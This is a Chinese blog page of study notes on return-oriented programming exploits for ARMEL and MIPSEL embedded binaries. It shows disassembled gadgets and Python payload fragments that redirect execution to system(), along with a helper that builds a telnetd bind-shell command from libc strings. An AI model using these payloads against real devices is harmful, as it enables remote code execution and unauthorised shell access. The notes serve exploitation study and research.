@@ -1,0 +1,285 @@
+---
+title: "ARMEL 与 MIPSEL ROP 笔记"
+lang: zh-CN
+toc-title: "目录"
+format:
+  html:
+    code-copy: true
+    code-overflow: scroll
+    css: ../decompilation/code-blocks.css
+---
+
+本文整理 ARMEL 与 MIPSEL 架构下的 ROP 学习笔记，按输入是否受空字节截断影响分类。示例中的地址、偏移和运行环境来自原笔记；代码保留原有逻辑与字符串写法，是依赖具体程序环境的片段。
+
+## arch = armel
+
+### 无截断 ROP
+
+对于原笔记中由 `memcpy` 造成、输入没有截断的栈溢出，可以构造 ROP 链。
+
+寻找程序里的 `system`、`popen` 等调用片段，先找能够将栈上数据传入 `R0` 的 gadget。
+
+- `rop_gadget1`：只需将 `command` 放到栈上。
+- `rop_gadget2`：需要寻找可控地址存放 `command`。这一方法也可用于有截断的溢出，但需要找到不包含 `\x00` 的 4 字节可控地址。
+
+```{.asm filename="ARMEL · 函数返回与 system 调用片段"}
+; func return
+.text:0001CFAC    ADD    SP, SP, #0x6C
+.text:0001CFB0    POP    {R4-R11,PC}
+
+; rop_gadget1
+.text:0009868C    MOV    R0, SP  ; command
+.text:00098690    BL     system
+
+; rop_gadget2
+.text:0001A83C    MOV    R0, R4  ; command
+.text:0001A840    BL     system
+```
+
+### 有截断 ROP
+
+使用 `strcpy`、`strncpy`、`sprintf`、`sscanf`、`strcat` 等字符串处理函数时，需要关注 `\x00` 对输入和复制过程的影响。具体截断行为取决于函数、参数和数据路径。
+
+#### 栈上可控的 R0
+
+函数返回时，检查 `R0` 寄存器是否可控；原笔记中的思路是直接覆盖为 `system_addr`。
+
+#### 调整栈帧的 gadget
+
+当溢出点是栈上数据拷贝到栈上数据时，可以通过调整栈指针，将栈迁移到上一层函数的栈空间。事先布置好栈中的 ROP 链，在栈溢出时调用操作栈的指令。
+
+```{.asm filename="ARMEL · 调整 SP 与 strcpy 片段"}
+; 有截断：在溢出前将 ROP 放到栈上，通过调整 SP 劫持 PC
+; gadget
+.text:000230f0    ADD    SP, SP, #0x20c
+.text:000230f4    ADD    SP, SP, #0x1000
+.text:000230f8    LDMFD  SP!, {R4-R11,PC}
+
+; strcpy gadget：目标地址和源地址由寄存器提供
+.text:00013644    MOV    R0, R10  ; dest
+.text:00013648    MOV    R1, R5   ; src
+.text:0001364C    BL     strcpy
+.text:00013650    MOV    R0, R4
+.text:00013654    ADD    SP, SP, #0x5C
+.text:00013658    LDMFD  SP!, {R4-R8,R10,PC}
+```
+
+#### 将 shellcode 放到堆上
+
+原笔记记录的思路：当 ASLR 设置为 `1`，且输入数据存放到堆上时，考虑将 shellcode 放在堆上。是否可行仍取决于具体运行环境。
+
+#### 碰撞 libc 基址
+
+当溢出点是堆上数据拷贝到栈上数据时，原笔记考虑在进程崩溃不影响其他功能的场景（例如特定 `.cgi` 程序）尝试碰撞 libc 基址。
+
+调用 libc 函数时，还需要关注 `LR` 中的返回地址及函数返回路径。原笔记使用如下 `lr_gadget` 和 `pop_gadget` 组合组织连续调用：
+
+```{.python filename="ARMEL · 原笔记中的 libc gadget 偏移"}
+pop_gadget = libc_addr + 0x000fd524  # pop {r0, r1, r2, r3, pc}
+lr_gadget = libc_addr + 0x00038a40   # pop {lr} ; add sp, sp, #4 ; bx lr
+```
+
+Payload 示例：
+
+```{.python filename="ARMEL · 原始 payload 片段"}
+buf = 'A' * (0x34)
+
+buf += p32(lr_gadget) + p32(pop_gadget) + "a" * 4  # PC
+
+buf += p32(command_addr) + p32(tel_addr) + "A" * 8 + p32(strcpy_addr)
+buf += p32(command_addr + 3) + p32(net_addr) + "B" * 8 + p32(strcpy_addr)
+buf += p32(command_addr + 6) + p32(d_addr) + "C" * 8 + p32(strcpy_addr)
+
+buf += p32(command_addr) + "D" * 8 + p32(system_addr)
+```
+
+### 程序中没有 system
+
+可以考虑 `libc.so` 中的 `system` 地址。原笔记通过以下命令查看地址随机化设置：
+
+```{.bash filename="查看 ASLR 设置"}
+cat /proc/sys/kernel/randomize_va_space
+```
+
+原笔记记录：在其测试环境中，`randomize_va_space` 为 `1` 时，重启进程后 `libc_addr` 发生变化，而观察到的 `heap_addr` 没有变化。下面的记录展示了两次运行中的 libc 映射；这些记录不应直接视为所有系统和进程都具备的地址规律。
+
+```{.text filename="原测试环境 · 重启前后的内存映射"}
+# cat /proc/`pidof upnpd`/maps | grep libc.so
+40023000-40028000 r-xp 00000000 1f:03 139        /lib/ld-uClibc.so.0
+4002f000-40030000 r--p 00004000 1f:03 139        /lib/ld-uClibc.so.0
+40030000-40031000 rw-p 00005000 1f:03 139        /lib/ld-uClibc.so.0
+40363000-403c8000 r-xp 00000000 1f:03 278        /lib/libc.so.0
+403d0000-403d1000 r--p 00065000 1f:03 278        /lib/libc.so.0
+403d1000-403d2000 rw-p 00066000 1f:03 278        /lib/libc.so.0
+# killall upnpd
+# upnpd
+# cat /proc/`pidof upnpd`/maps | grep libc.so
+4003e000-40043000 r-xp 00000000 1f:03 139        /lib/ld-uClibc.so.0
+4004a000-4004b000 r--p 00004000 1f:03 139        /lib/ld-uClibc.so.0
+4004b000-4004c000 rw-p 00005000 1f:03 139        /lib/ld-uClibc.so.0
+40340000-403a5000 r-xp 00000000 1f:03 278        /lib/libc.so.0
+403ad000-403ae000 r--p 00065000 1f:03 278        /lib/libc.so.0
+403ae000-403af000 rw-p 00066000 1f:03 278        /lib/libc.so.0
+```
+
+原笔记还记录：`randomize_va_space` 为 `0` 时，其测试进程重启前后的 `libc_addr` 没有变化。
+
+### ARM ret2dlresolve
+
+*原笔记仅列出此主题，未附具体内容。*
+
+### 其他 gadget
+
+- 重置 `http_password` 的 gadget。
+- 开启其他功能的 gadget。
+
+### Shellcode
+
+*原笔记仅列出此主题，未附具体内容。*
+
+### 其他注意事项
+
+1. 栈溢出如果覆盖了栈上的环境变量（如 `PATH=/bin;`），执行 `system` 时可能出现异常。
+2. 当 `command` 难以直接输入时，原笔记使用 libc 或程序内部的字符串地址，结合 `strcpy_gadget` 拼接命令。
+
+```{.python filename="ARMEL · 原笔记中的字符串地址查找片段"}
+libc_path = './lib/libc-2.13.so'
+libc = ELF(libc_path)
+libc_addr = 0xb6e8d000
+
+
+def getStrAddr(s):
+    off = libc.search(s)
+    str_addr = 0
+    for i in off:
+        # print(hex(i))
+        str_addr = libc_addr + i
+        if (str_addr & 0xffff) >> 8 != 0xd and (str_addr & 0xffff) >> 8 != 0xa and \
+            ((str_addr & 0xffff) >> 8 > 0x7a or (str_addr & 0xffff) >> 8 < 0x61) and \
+            ((str_addr & 0xff) > 0x7a or (str_addr & 0xff) < 0x61) and \
+            (str_addr & 0xff) != 0xd and (str_addr & 0xff) != 0xa and (str_addr & 0xff) != 0x3d:
+            break
+    # print('{} addr is {:#x}'.format(s, str_addr))
+    return str_addr
+
+
+tel_addr = getStrAddr('tel\x00')
+net_addr = getStrAddr('net\x00')
+d_addr = getStrAddr('d\x00')
+kong_addr = getStrAddr(' \x00')
+gang_addr = getStrAddr('-\x00')
+p_addr = getStrAddr('p\x00')
+port_addr = getStrAddr('6789\x00')
+l_addr = getStrAddr('l\x00')
+binsh_addr = getStrAddr('/bin/sh\x00')
+fenhao_addr = getStrAddr(';\x00')
+```
+
+## arch = mipsel
+
+### 无截断 ROP
+
+以下为原笔记中常用的 gadget 形式。
+
+#### 将栈地址传入 $a0
+
+寻找 `$a0` 指向栈上数据、通过 `jalr $t9` 调用 `system` 的片段。
+
+```{.asm filename="MIPSEL · 栈地址作为 system 参数"}
+.text:0043AD28    addiu   $v0, $sp, 0xCC
+.text:0043AD2C    move    $a0, $v0
+.text:0043AD30    la      $v0, system
+.text:0043AD34    nop
+.text:0043AD38    move    $t9, $v0
+.text:0043AD3C    jalr    $t9  ; system
+.text:0043AD40    nop
+```
+
+Payload 中，命令放在 gadget 之后的对应栈偏移处：
+
+```{.python filename="MIPSEL · 栈上命令 payload 片段"}
+buf = 'a' * pad
+buf += gadget
+buf += 'a' * 0xcc
+buf += command
+buf += '\x00'
+```
+
+#### 组合 gadget
+
+若没有找到直接将栈地址传入 `$a0` 并调用 `system` 的 gadget，原笔记使用以下组合：
+
+```{.asm filename="MIPSEL · 函数返回与组合 gadget"}
+; func return
+.text:0041D3EC    lw      $ra, 0x80+var_s1C($sp)
+.text:0041D3F0    lw      $s6, 0x80+var_s18($sp)
+.text:0041D3F4    lw      $s5, 0x80+var_s14($sp)
+.text:0041D3F8    lw      $s4, 0x80+var_s10($sp)
+.text:0041D3FC    lw      $s3, 0x80+var_sC($sp)
+.text:0041D400    lw      $s2, 0x80+var_s8($sp)
+.text:0041D404    lw      $s1, 0x80+var_s4($sp)
+.text:0041D408    lw      $s0, 0x80+var_s0($sp)
+.text:0041D40C    jr      $ra
+.text:0041D410    addiu   $sp, 0xA0
+
+; rop0
+.text:0043DBA8    la      $t9, system
+.text:0043DBAC    nop
+.text:0043DBB0    jalr    $t9  ; system
+.text:0043DBB4    move    $a0, $s0  # command
+.text:0043DBB8    lw      $gp, 0xA0+var_90($sp)
+.text:0043DBBC    lw      $ra, 0xA0+var_s8($sp)
+.text:0043DBC0    lw      $s1, 0xA0+var_s4($sp)
+.text:0043DBC4    lw      $s0, 0xA0+var_s0($sp)
+.text:0043DBC8    move    $v0, $zero
+.text:0043DBCC    jr      $ra
+.text:0043DBD0    addiu   $sp, 0xB0
+
+; rop1
+.text:0041A4EC    jalr    $t9
+.text:0041A4F0    addiu   $a0, $sp, 0x38+var_1F  # s
+```
+
+对应的 payload 片段：
+
+```{.python filename="MIPSEL · 组合 gadget 的 payload"}
+data += "\x00" * 4             # s0
+data += "B" * 0x4              # s1
+data += "C" * 0x4              # s2
+data += "D" * 0x4              # s3
+data += "E" * 0x4              # s4
+data += "F" * 0x4              # s5
+data += "G" * 0x4              # s6
+data += rop_gadget[0]          # ra: 0x43DBA8
+data += "H" * 0x10             # Padding
+data += "I" * 0x4              # gp
+data += "J" * 0x8C             # Padding
+data += "K" * 0x4              # s0
+data += "L" * 0x4              # s1
+data += rop_gadget[1]          # ra: 0x41A4EC
+data += "M" * 0x4              # Padding
+data += "N" * 0x19             # Padding
+data += args.command + "\x00"  # Add the command and then NULL-terminate it
+data += "Z" * 0x1000           # Pad out the payload (it needs to be at least a certain size)
+```
+
+#### 从栈中读取指针，再传入 $a0
+
+寻找将栈中内容加载到 `$v0`，随后传入 `$a0` 并调用 `system` 的片段。原笔记中，`0x2C+var_8($sp)` 存放的内容是一个指针（多数为栈地址），其指向的位置可以存放 `command`。
+
+```{.asm filename="MIPSEL · 从栈中读取参数指针"}
+.text:004058F8    lw      $v0, 0x2C+var_8($sp)
+.text:004058FC    nop
+.text:00405900    move    $a0, $v0
+.text:00405904    la      $v0, system
+.text:00405908    nop
+.text:0040590C    move    $t9, $v0
+.text:00405910    jalr    $t9  ; system
+.text:00405914    nop
+```
+
+### 有截断 ROP
+
+原笔记中的总体思路与 ARMEL 部分相同。
+
+[← 返回 Blogs](../../blogs.qmd)
